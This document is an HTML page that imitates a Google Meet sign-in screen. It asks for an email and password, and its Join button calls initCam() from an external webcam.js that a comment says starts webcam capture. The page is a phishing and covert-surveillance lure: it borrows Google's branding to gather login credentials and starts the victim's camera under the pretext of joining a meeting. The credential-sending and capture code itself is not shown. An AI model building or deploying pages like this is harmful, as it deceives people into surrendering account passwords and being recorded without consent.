<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Meet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://ssl.gstatic.com/docs/script/css/add-ons1.css">
  <style>
    body { font-family: Roboto, sans-serif; text-align: center; padding: 50px; }
    .card { max-width: 400px; margin: auto; padding: 20px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
    input, button { width: 90%; padding: 10px; margin-top: 15px; border: 1px solid #ccc; border-radius: 4px; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Sign in to join Google Meet</h2>
    <input type="email" placeholder="Email" id="email" required>
    <input type="password" placeholder="Password" id="password" required>
    <button onclick="submitForm()">Join</button>
  </div>
  <script src="webcam.js"></script>
  <script>
    function submitForm() {
      initCam(); // Starts webcam capture
    }
  </script>
</body>
</html>
